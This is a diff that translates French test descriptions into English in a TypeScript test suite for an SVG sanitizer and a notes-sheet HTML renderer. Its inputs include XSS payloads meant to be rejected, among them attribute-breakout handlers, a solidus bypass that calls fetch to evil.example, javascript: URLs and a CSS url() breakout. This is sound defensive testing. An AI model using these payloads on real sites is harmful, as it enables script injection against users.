@@ -6,9 +6,8 @@ import { renderNotesSheet, sanitizeInlineSvg, type SheetLabels, type SheetNote }
 import { annotationToSvg } from './annotationSvg';
 
 /**
- * La planche est le seul HTML que ReView compose à partir de texte saisi par des
- * utilisateurs et que quelqu'un ouvrira dans un navigateur. Deux exigences : rien
- * d'exécutable ne doit y entrer, et la frame commentée doit s'y voir.
+ * The sheet is the only HTML ReView composes from text typed by users that someone will open in a browser. Two
+ * requirements: nothing executable may enter it, and the commented frame must be visible in it.
  */
 
 const labels: SheetLabels = {
@@ -38,29 +37,29 @@ const note = (over: Partial<SheetNote> = {}): SheetNote => ({
 });
 
 describe('sanitizeInlineSvg', () => {
-  it('laisse passer un SVG d’annotation ordinaire', () => {
+  it('lets an ordinary annotation SVG through', () => {
     const svg = '<svg xmlns="http://www.w3.org/2000/svg"><rect x="1" y="2" stroke="#FF3B30" /></svg>';
     expect(sanitizeInlineSvg(svg)).toBe(svg);
   });
 
-  it('rejette un SVG dont une couleur a refermé l’attribut pour poser un gestionnaire', () => {
+  it('rejects an SVG whose colour closed the attribute to inject a handler', () => {
     const svg = '<svg><rect stroke="" onload="alert(1)" /></svg>';
     expect(sanitizeInlineSvg(svg)).toBeNull();
   });
 
-  it('rejette script, foreignObject et URL exécutable', () => {
+  it('rejects script, foreignObject and executable URLs', () => {
     expect(sanitizeInlineSvg('<svg><script>alert(1)</script></svg>')).toBeNull();
     expect(sanitizeInlineSvg('<svg><foreignObject><b>x</b></foreignObject></svg>')).toBeNull();
     expect(sanitizeInlineSvg('<svg><a href="javascript:alert(1)">x</a></svg>')).toBeNull();
   });
 
-  it('rend null quand il n’y a rien à dessiner', () => {
+  it('returns null when there is nothing to draw', () => {
     expect(sanitizeInlineSvg(null)).toBeNull();
   });
 });
 
 describe('renderNotesSheet', () => {
-  it('compose un document autonome avec le titre et l’aide à l’impression', () => {
+  it('composes a standalone document with the title and the print help', () => {
     const html = renderNotesSheet({
       title: 'Review notes',
       subtitle: 'Projet — SH020',
@@ -74,7 +73,7 @@ describe('renderNotesSheet', () => {
     expect(html).toContain('No notes to print here.');
   });
 
-  it('échappe le texte d’une note qui contient du balisage', () => {
+  it('escapes the text of a note that contains markup', () => {
     const html = renderNotesSheet({
       title: 't',
       subtitle: 's',
@@ -86,7 +85,7 @@ describe('renderNotesSheet', () => {
     expect(html).toContain('&lt;img src=x');
   });
 
-  it('affiche le repère de temps, l’état et la décision de chaque note', () => {
+  it('shows the time marker, status and decision of each note', () => {
     const html = renderNotesSheet({ title: 't', subtitle: 's', labels, notes: [note()], truncated: null });
     expect(html).toContain('Frame <b>1024</b>');
     expect(html).toContain('Timecode <b>00:00:00:23</b>');
@@ -94,7 +93,7 @@ describe('renderNotesSheet', () => {
     expect(html).toContain('SQ010 · SH020 › comp · v003');
   });
 
-  it('découpe la vignette dans la sprite et pose l’annotation par-dessus', () => {
+  it('cuts the thumbnail out of the sprite and places the annotation over it', () => {
     const html = renderNotesSheet({
       title: 't',
       subtitle: 's',
@@ -117,12 +116,12 @@ describe('renderNotesSheet', () => {
     expect(html).toContain('<rect x="1" />');
   });
 
-  it('annonce le repli quand aucune image n’est disponible', () => {
+  it('announces the fallback when no image is available', () => {
     const html = renderNotesSheet({ title: 't', subtitle: 's', labels, notes: [note()], truncated: null });
     expect(html).toContain('No frame available');
   });
 
-  it('met une réponse en retrait et signale la troncature', () => {
+  it('indents a reply and flags the truncation', () => {
     const html = renderNotesSheet({
       title: 't',
       subtitle: 's',
@@ -136,39 +135,38 @@ describe('renderNotesSheet', () => {
 });
 
 /**
- * Le filtre a été pris en défaut le 2026-09-16 : sa règle des gestionnaires exigeait un
- * BLANC devant (`\son…=`), si bien qu'un `/onbegin=` — forme que l'analyseur HTML accepte
- * pour séparer deux attributs — traversait la planche intact. Ces tests fixent les formes
- * exactes qui passaient.
+ * The filter was caught out on 2026-09-16: its handler rule required a WHITESPACE before (`\son…=`), so an `/onbegin=`
+ * — a form the HTML parser accepts to separate two attributes — went through intact. These tests pin down the exact
+ * forms that got through.
  */
-describe('sanitizeInlineSvg — contournements', () => {
-  it('rejette un gestionnaire introduit par un solidus', () => {
+describe('sanitizeInlineSvg — bypasses', () => {
+  it('rejects a handler introduced by a solidus', () => {
     const svg =
       '<svg><rect stroke="#fff"/><animate attributeName="x"/onbegin="fetch(\'https://evil.example\')" /></svg>';
     expect(sanitizeInlineSvg(svg)).toBeNull();
   });
 
-  it('rejette un gestionnaire recollé au guillemet fermant du précédent', () => {
+  it('rejects a handler glued to the closing quote of the previous attribute', () => {
     expect(sanitizeInlineSvg('<svg><rect stroke="#fff"onload="alert(1)" /></svg>')).toBeNull();
   });
 
-  it('rejette les balises d’animation, de style et de lien', () => {
+  it('rejects animation, style and link tags', () => {
     for (const tag of ['animate', 'set', 'animateTransform', 'style', 'a', 'switch', 'handler']) {
       expect(sanitizeInlineSvg(`<svg><${tag}>x</${tag}></svg>`)).toBeNull();
     }
   });
 
-  it('rejette un commentaire, une instruction de traitement ou un chevron esseulé', () => {
+  it('rejects a comment, a processing instruction or a lone angle bracket', () => {
     expect(sanitizeInlineSvg('<svg><!--<script>alert(1)</script>--></svg>')).toBeNull();
     expect(sanitizeInlineSvg('<svg><?xml-stylesheet href="x"?></svg>')).toBeNull();
     expect(sanitizeInlineSvg('<svg>< </svg>')).toBeNull();
   });
 
-  it('rejette un href, seul moyen pour une forme de pointer ailleurs', () => {
+  it('rejects an href, the only way for a shape to point elsewhere', () => {
     expect(sanitizeInlineSvg('<svg><text xlink:href="https://evil.example">x</text></svg>')).toBeNull();
   });
 
-  it('laisse passer le SVG que le rendu produit réellement', () => {
+  it('lets through the SVG the renderer actually produces', () => {
     const svg = annotationToSvg(
       [
         { type: 'rect', x: 0.1, y: 0.1, w: 0.2, h: 0.2, color: '#ef4444' },
@@ -189,8 +187,8 @@ describe('sanitizeInlineSvg — contournements', () => {
     expect(sanitizeInlineSvg(svg)).toBe(svg);
   });
 
-  it('laisse passer le rendu d’une couleur piégée, désormais neutralisée en amont', () => {
-    // La défense est dans `annotationSvg` : le filtre n'a plus rien à rejeter.
+  it('lets through the rendering of a trapped colour, now neutralised upstream', () => {
+    // The defence lives in `annotationSvg`: the filter has nothing left to reject.
     const svg = annotationToSvg(
       [{ type: 'rect', w: 0.1, h: 0.1, color: '#fff"/><animate attributeName="x"/onbegin="alert(1)' }],
       160,
@@ -201,7 +199,7 @@ describe('sanitizeInlineSvg — contournements', () => {
   });
 });
 
-describe('renderNotesSheet — sources d’image', () => {
+describe('renderNotesSheet — image sources', () => {
   const sheet = (src: string) =>
     renderNotesSheet({
       title: 't',
@@ -211,24 +209,24 @@ describe('renderNotesSheet — sources d’image', () => {
       truncated: null,
     });
 
-  it('n’incruste que des data URI : le document se veut autonome', () => {
+  it('embeds only data URIs: the document is meant to be standalone', () => {
     const html = sheet('https://tracker.example/pixel.png');
     expect(html).not.toContain('tracker.example');
     expect(html).toContain('No frame available');
   });
 
-  it('refuse une source qui sortirait du url() CSS ou de l’attribut', () => {
+  it('refuses a source that would break out of the CSS url() or the attribute', () => {
     expect(sheet("data:image/png;base64,AAA');background-image:url('https://evil.example/x")).not.toContain(
       'evil.example',
     );
     expect(sheet('data:image/png;base64,AAA" onerror="alert(1)')).not.toContain('onerror');
   });
 
-  it('refuse un SVG, seul format d’image qui embarque du balisage', () => {
+  it('refuses an SVG, the only image format that embeds markup', () => {
     expect(sheet('data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=')).not.toContain('svg+xml');
   });
 
-  it('borne les dimensions écrites dans le style', () => {
+  it('bounds the dimensions written into the style', () => {
     const html = renderNotesSheet({
       title: 't',
       subtitle: 's',
